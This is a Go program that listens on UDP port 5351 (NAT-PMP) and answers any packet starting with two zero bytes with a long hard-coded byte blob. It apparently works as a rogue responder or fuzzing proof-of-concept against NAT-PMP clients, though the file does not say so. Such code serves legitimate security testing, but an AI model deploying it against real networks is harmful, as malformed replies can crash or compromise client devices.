package main
import (
    "fmt" 
    "net"  
    "reflect"
)


func sendResponse(conn *net.UDPConn, addr *net.UDPAddr) {
    response := "\xCD\xC2\x32\x80\x0D\x26\x13\xEC\xA6\x7B\x8C\xE1\x84\x95\xDB\x56\x97\xD4\x90\xA9\xAB\xB0\x83\xD9\xE0\x13\x5D\xC1\x67\xFD\x15\xB4\x97\x57\xCD\x8C\x72\xBA\xBE\x64\x8D\x5F\xC4\xBB\x76\x01\x0A\x5D\x11\x1A\x8F\x20\xAD\xBD\x6D\x59\xB9\x54\x44\xEB\x22\xC0\x1F\x8D\x55\xA1\x94\xA1\x05\xB1\xBF\xF9\x5C\x65\xB9\x10\x9A\x62\x00\x02\xBA\x30\x69\xDC\xFF\x24\x73\x92\x75\x4B\xA8\x2C\x77\x1B\xCC\x95\xE5\xCE\x3D\x00\xFB\x9D\x46\xD7\x42\x07\x4B\x61\x62\x90\xA2\x7A\x49\x03\x69\xB9\x98\x6E\x05\xC2\xCD\x21\x57\x4A\xF2\xF3\x6D\x85\x23\x15\x68\x42\x3E\x45\xFF\x93\x36\x35\x50\x10\x16\x4F\x1F\x32\x2B\xA4\x30\x1E\x98\x8F\x98\x8E\x46\x96\x66\x5E\xE7\xE7\x0E\x09\x06\xCB\x5E\xA8\xBD\x7B\xD6\xF7\x01\xF1\xB2\x00\xD5\x67\xE7\xC7\x21\x3F\x4E\xBD\x28\xF0\x47\x90\x90\xCF\xCF\x8E\x7F\xD9\x59\x74\x58\x67\x10\x97\x47\xFC\xE1\xA8\x48\x71\x00\x9D\xDF\x98\xC2\xA6\xD7\xB8\x4C\xA1\x16\x6A\xCB\xF6\x2E\x9E\xF5\x4A\xE5\x8B\x19\xDE\x83\xD7\x9F\x1A\x68\x59\xBD\x21\xBC\x49\xCF\x70\x04\xF5\x09\x7F\xDF\xBD\x01\x57\x71\x16\xFA\xE7\x5D\x5F\x46\xB1\xD8\x01\x0C\x10\x1F\x65\xD6\xCF\x13\xE9\x6E\x4B\x69\x58\xC1\xDF\x10\x3A\xFF\x29\xB5\x4A\x87\x00\x6F\x7E\x11\x57\xC0\x83\xB7\x6B\x65\x5E\xAE\x7C\x83\x35\x47\xF2\xA7\xAB\x75\x7B\x85\x73\x0F\xE9\xAA\xB4\xC3\x75\x73\xD4\xFC\x50\x2B\x7A\x9E\xCB\xA7\xF6\x44\x43\xC3\x4C\x2E\x6E\xCE\xFD\xFA\xA3\x50\x0B\x33\x4F\x9C\x92\xB3\x6E\x74\xD0\xB7\x77\x62\x3D\xD4\x37\x1A\xA6\x78\x03\xD4\xD4\x67\xAE\xA0\x93\x82\x09\x08\xE7\xBD\x8D\x72\xE3\xF0\x77\x12\x5D\x17\x2F\x2C\xFC\xFF\x8A\x5A\xC6\xBB\x23\x4B\xA3\x8D\xCB\x77\x12\x98\x1E\x52\xC6\x27\xCD\x04\xFA\xDD\x27\x36\x81\xEF\xE5\x39\x48\xA4\x01\xCA\x7E\x5E\xBF\xC9\x77\xB6\xEF\x28\x21\x60\x15\x80\x19\x8B\x96\x2F\xD3\x03\x8E\x7C\x43\x56\xEA\xC2\xF2\x94\xE3\x08\x99\xB2\xFA\x07\xEA\xE8\x3C\xED\x64\x96\xF7\x54\x55\xE4\xAB\xEF\x68\xAC\xB7\x45\x1D\xFB\x73\x89\xFD\x07\xD0\x96\xE6\x31\xDE\x2B\x66\xA7\x29\x9E\x71\x16\x22\x82\x8C\xF6\xD2\xA4\xB7\xAE\x9F\x7F\x19\x54\x5B\x35\x75\x95\xC7\xBB\x30\xE4\x79\x4B\x06\x49\xF2\xF3\xA0\xAD\x8C\x86\xF3\x20\x91\x10\x8A\x8B\xF7\x0E\x4E\xD0\x58\x78\x84\xBE\x30\xB0\x47\xE1\xAA\xF5\x36\xC3\xA5\xFF\x71\x72\xD4\x27\x56\x96\x85\xAA\xFF\xE2\x48\xB7\xB0\x42\x79\xFA\x68\xA5\xAD\x8F\xFC\xF6\xA3\x2B\xD5\x84\xAF\xA7\x66\x67\xC9\xF3\x7A\xBF\xE5\x42\xE2\xC6\x8C\xED\x72\x3C\x8A\x61\xD2\x48\x37\xBA\x0E\x33\x43\x20\x4C\x81\x40\xCB\x03\x3A\x95\x1F\x00\x0B\x56\xBB\x71\xA2\xFB\xFA\x1D\x33\x3A\x79\x60\xC9\x76\x99\xC0\x54\x69\xD1\xFD\xFD\x17\x60\x3E\x39\x78\xD0\xA7\xB5\xC6\xF5\xE3\xCD\x48\xD7\x4F\xA4\xD1\x09\x29\xE2\x32\x55\x51\x2F\x2A\x7B\x76\x47\xF7\xA5\x59\x9B\x3C\x7A\xCC\x5B\xE3\x98\x7D\x34\xD4\xA2\xA0\x69\x93\xE5\x34\xCD\x47\x78\x18\x32\xF1\x6F\xA5\xAD\x6B\xC7\x5D\xFC\x1D\x8E\x7E\x6B\xA2\x35\x83\xC4\xA9\x94\x47\x39\x52\xFE\x5F\x4F\x5D\xCA\xEC\x3D\x7E\x58\x3C\x86\xB9\x76\xEC\xCC\x44\xA8\xA3\xF6\x7B\xAB\x60\xB2\x76\x5E\xDE\xA9\x79\x99\xFA\x01\xC5\xE4\xF7\xB8\x8F\x0D\x2B\x36\xB8\xBC\xAC\x8F\xF2\xE8\x83\x95\x59\xEF\xC8\xC3\xF9\x65\x05\xAF\xC0\x99\xB6\xBC\x0C\x81\x47\x39\xBD\x6D\x49\x9F\x34\x1B\xE0\x94\xCC\x6A\xAE\x66\x0B\xE8\x7C\xDE\x9A\xC8\x9D\x9B\x97\x12\xBD\x79\x64\xBE\xFA\x9B\xAC\x0D\xC3\x88\xA6\xFA\x31\x00\xA8\x97\xDC\x95\x1D\x1C\x8D\xC5\x3C\x17\xCD\x7E\x65\x88\xDE\x0F\x3D\x55\xF9\x72\x7F\x3F\xC8\xC8\x2D\x74\x9A\x8A\x58\x25\x85\x68\xA7\x61\x6C\xF4\x21\xD5\x74\xDC\x0A\xBE\x49\xE5\x48\x30\xE9\xF4\xDE\x89\xB6\xDC\xA9\x10\xF2\x48\x32\xA3\x58\xFD\x0F\x96\x60\x33\xDA\x19\x6D\xA9\x8D\x9A\xEF\x91\x9F\x0D\x41\x59\x9A\x7E\xD3\x6D\x0C\x3C\xDA\xE6\x71\x75\x3B\x5D\x51\x31\xBA\x10\xD7\xF5\x15\x1C\xEF\x3A\xF2\x0B\xAE\xF7\x04\x68\x97\xA9\xDD\x71\x3C\x78\x8E\x7F\x02\xA2\x73\x44\xB4\x9A\x74\x16\xEA\xC8\x17\x09\x62\x7C\xC2\x10\xD0\x4A\x35\x71\x2C\xEE\x14\x65\xA4\x16\x16\x08\x8D\x58\x55\x97\xF8\x54\x51\x43\xE9\xAA\x55\xFE\xA1\x78\xF1\xD7\xFA\x8A\xDD\x64\xE8\xCD\xE1\x89\xDC\x4C\x41\xAA\x04\x07\x1D\x23\x24\xC9\xE9\x76\x4D\xD4\xD5\x6E\x2F\xDC\x39\x6D\xC7\x81\x7E\xB8\x6A\x95\xBE\x46\x16\xDE\x39\x24\x57\x6A\x65\xF5\xEB\xB1\x76\x31\x77\x3C\x2D\xE6\x34\x24\xB6\x58\x72\x45\x55\xDB\x90\xC9\xC4\xAD\x10\x71\x46\x8B\xA8\xF3\x6A\xA4\x84\x12\x46\x69\x61\x57\x3B\x0F\xF0\x05\xA7\x16\x99\x53\xDF\x7C\xA9\x68\x54\x5E\x32\xD8\xA2\x84\xB9\xDC\x6C\x2D\x10\xA3\x91\xB7\x9D\xBC\x75\x3F\xB2\xA8\x3A\x44\x22\x91\xE9\xDE\xFC\xB2\x16\x86\xAC\x44\x08\xC0\xEC\x6E\x9E\xDA\x73\xE4\x21\xCC\x44\x46\xD7\x27\xEB\x54\xA3\x78\xE9\x26\xA6\xEA\x54\xEB\x82\x95\x20\x8C\xA4\xB7\xCB\x1F\x93\x4D\x36\x21\x4F\xFC\x0B\xDA\x69\x68\x21\xB5\x59\xC1\x5C\xC5\xCB\x80\x20\xDC\x15\xC5\xB5\xFE\x9B\x67\x0E\xA5\x59\x05\xE8\xE4\xA7\x40\xBE\xD7\x27\xE7\xF7\x56\xE4\xF0\x0C\xE8\x7A\x27\x52\xCE\x24\x96\x7F\xC9\xEB\x91\x0F\x63\x0A\x04\x16\xC5\x1E\xF4\x19\x50\xDC\x83\xEB\x3F\x31\x44\xD3\xD9\xAB\x42\xF2\x68\xAD\x56\x0A\xC0\xED\x98\x3F\x71\x9C\x41\x7A\xE6\x79\x63\xF0\x55\xB8\x51\x9B\x97\x19\xFB\x84\xAC\xBA\x3B\x15\xCF\xC7\x44\x5C\x9D\x78\x37\xBE\x46\xEE\xDE\x9E\x76\x54\xBA\xF0\xD7\x2F\xCF\xB0\x21\x9D\xD4\xD8\x35\x40\x26\x8A\x2D\x7B\x9C\x41\xD6\x4A\x9A\x1E\xC2\x74\x1B\x6E\x4E\x64\x86\x36\x02\x5A\xAE\xB8\x23\xF1\x8F\x9B\x51\x2B\xB7\xFC\xB7\x6C\xA8\x1C\xCB\x13\xFA\xD5\xBC\xAE\x24\x89\x97\xD8\x5D\x52\x28\x2C\x29\x74\xD6\xE2\x16\x3C\x0B\x8D\xFF\x30\xD3\xC0\x7C\x25\x2B\x9D\x69\xC1\x14\xB7\xD4\x6D\xF0\x0D\x9C\x3A\x34\x2D\x5F\x37\x93\x4A\xC0\xA6\xF5\x34\xE0\x48\x45\xD6\xA9\x28\xD6\x2C\x67\x7A\x2C\x2D\x11\x42\x65\x42\x91\xA3"
    _,err := conn.WriteToUDP([]byte(response), addr)
    fmt.Printf("Success")
    if err != nil {
        fmt.Printf("Couldn't send response %v", err)
    }
}


func main() {
    p := make([]byte, 2048)
    addr := net.UDPAddr{
        Port: 5351,
        IP: net.ParseIP("0.0.0.0"),
    }
    ser, err := net.ListenUDP("udp", &addr)
    if err != nil {
        fmt.Printf("Some error %v\n", err)
        return
    }
    for {
        _,remoteaddr,err := ser.ReadFromUDP(p)
        // fmt.Printf("Read a message from %v %s \n", remoteaddr, p)
	h := "\x00\x00"
        m := []byte(h)
	pp := []byte(p)[0:2]
	if reflect.DeepEqual(pp, m) {
		go sendResponse(ser, remoteaddr)	
		}
	fmt.Println(pp,m)
	if err !=  nil {
            fmt.Printf("Some error  %v", err)
            continue
        }
        continue
      }
}
